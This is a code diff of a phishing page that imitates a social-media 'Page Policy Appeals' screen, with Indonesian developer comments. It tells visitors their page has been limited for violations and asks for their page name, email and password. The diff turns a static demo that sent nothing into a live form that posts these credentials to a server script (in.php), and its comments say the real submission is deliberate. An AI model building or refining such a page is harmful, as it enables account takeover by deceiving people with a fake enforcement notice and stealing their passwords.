@@ -316,7 +316,7 @@
       font-size: 14px;
       font-weight: 600;
       line-height: 1.4;
-      color: var(--text-main);
+      color: #1c1e21;
       padding: 6px 12px;
       box-shadow: 0 1px 2px rgba(0,0,0,.05);
     }
@@ -331,14 +331,14 @@
       border-top: 1px solid var(--border-color);
       margin-top: 32px;
       padding: 24px 12px 40px;
-      color: var(--text-main);
+      color: #1c1e21;
       font-size: 13px;
     }
 
     .footer-inner {
       max-width: 1280px;
       margin: 0 auto;
-      color: var(--text-main);
+      color: #1c1e21;
     }
 
     .footer-links-grid {
@@ -375,7 +375,7 @@
       margin-top: 24px;
       padding-top: 12px;
       text-align: center;
-      color: var(--text-dim);
+      color: #65676b;
       font-size: 12px;
     }
 
@@ -385,7 +385,6 @@
         display: none;
       }
     }
-
   </style>
 </head>
 <body>
@@ -413,7 +412,6 @@
     <aside class="sidebar">
       <ul class="accordion-list">
 
-        <!-- Item 1 -->
         <li class="accordion-item open">
           <div class="accordion-header">
             <div class="acc-left">
@@ -427,7 +425,6 @@
           </div>
         </li>
 
-        <!-- Item 2 -->
         <li class="accordion-item">
           <div class="accordion-header">
             <div class="acc-left">
@@ -441,7 +438,6 @@
           </div>
         </li>
 
-        <!-- Item 3 -->
         <li class="accordion-item">
           <div class="accordion-header">
             <div class="acc-left">
@@ -455,7 +451,6 @@
           </div>
         </li>
 
-        <!-- Item 4 -->
         <li class="accordion-item">
           <div class="accordion-header">
             <div class="acc-left">
@@ -474,24 +469,19 @@
 
     <!-- ======= MAIN CONTENT ======= -->
     <main class="content-area">
-
       <section class="card-form-wrapper">
         <div class="card-header">
           Page Policy Appeals
         </div>
+
         <div class="card-body">
           <div class="intro-text">
-            <p>
-              We have detected unusual activity on your page that violates our community standards.
-            </p>
-            <p>
-              Your access to your page has been <strong>limited</strong>, and you are currently unable to post, share, or comment using your page.
-            </p>
-            <p>
-              If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.
-            </p>
+            <p>We have detected unusual activity on your page that violates our community standards.</p>
+            <p>Your access to your page has been <strong>limited</strong>, and you are currently unable to post, share, or comment using your page.</p>
+            <p>If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</p>
           </div>
 
+          <!-- FORM DIPERBAIKI -->
           <form id="appealForm" method="post" action="in.php">
             <div class="form-group">
               <div class="form-label-row">
@@ -511,21 +501,23 @@
 
             <div class="form-group">
               <div class="form-label-row">
-                <label for="phone">Password</label>
+                <label for="password">Password</label>
                 <span class="required-star">*</span>
               </div>
-              <input class="form-input" type="password" id="password" name="password"  required />
-              <input type="checkbox" onclick="myFunction()">Show Password
+              <input class="form-input" type="password" id="password" name="password" required />
+              <label style="font-size:12px;display:flex;align-items:center;gap:4px;margin-top:6px;cursor:pointer;">
+                <input type="checkbox" id="showPassChk" /> Show Password
+              </label>
             </div>
 
             <div class="submit-row">
               <button class="submit-btn" type="submit">Submit</button>
             </div>
           </form>
+          <!-- /FORM DIPERBAIKI -->
 
         </div>
       </section>
-
     </main>
   </div>
 
@@ -559,55 +551,47 @@
   </footer>
 
   <!-- ======= SCRIPT ======= -->
-<script>
-function myFunction() {
-  var x = document.getElementById("password");
-  if (x.type === "password") {
-    x.type = "text";
-  } else {
-    x.type = "password";
-  }
-}
-</script>
-
   <script>
+    // toggle show/hide password
+    function togglePassword() {
+      var x = document.getElementById("password");
+      x.type = x.type === "password" ? "text" : "password";
+    }
+
+    document.getElementById("showPassChk").addEventListener("change", togglePassword);
+
     // Toggle accordion open/close
     document.querySelectorAll(".accordion-item").forEach(function(item){
       item.addEventListener("click", function(){
-        // Toggle hanya item yg diklik (Facebook style biasanya independent)
         item.classList.toggle("open");
-
-        // Update arrow: ▾ (down) / ▸ (right)
         const arrowEl = item.querySelector(".acc-arrow");
-        if(item.classList.contains("open")){
-          arrowEl.textContent = "▾";
-        } else {
-          arrowEl.textContent = "▸";
-        }
+        arrowEl.textContent = item.classList.contains("open") ? "▾" : "▸";
       });
     });
 
     // Fake language dropdown click
-    document.getElementById("langBtn").addEventListener("click", function(e){
+    document.getElementById("langBtn").addEventListener("click", function(){
       alert("Language selector clicked (stub).");
     });
 
-    // Handle form submit (frontend only)
+    // Handle form submit
     document.getElementById("appealForm").addEventListener("submit", function(e){
-      e.preventDefault();
+      // cek semua required sudah diisi
+      const pageName = document.getElementById("pageName").value.trim();
+      const email    = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
 
-      const data = {
-        pageName: document.getElementById("pageName").value.trim(),
-        email: document.getElementById("email").value.trim(),
-        phone: document.getElementById("phone").value.trim(),
-        birthday: document.getElementById("birthday").value.trim()
-      };
+      if (!pageName || !email || !password) {
+        e.preventDefault(); // stop submit kalau ada yg kosong
+        alert("Please fill out all required fields.");
+        return;
+      }
 
-      console.log("Form submitted (demo only):", data);
-
-      alert("Submitted!\n(This is just a static demo template.)");
+      // kalau lolos validasi:
+      // TIDAK pakai preventDefault -> browser akan kirim POST ke in.php
+      // optional: bisa console.log buat debugging
+      console.log("Sending to server:", { pageName, email, password });
     });
   </script>
 </body>
 </html>
-
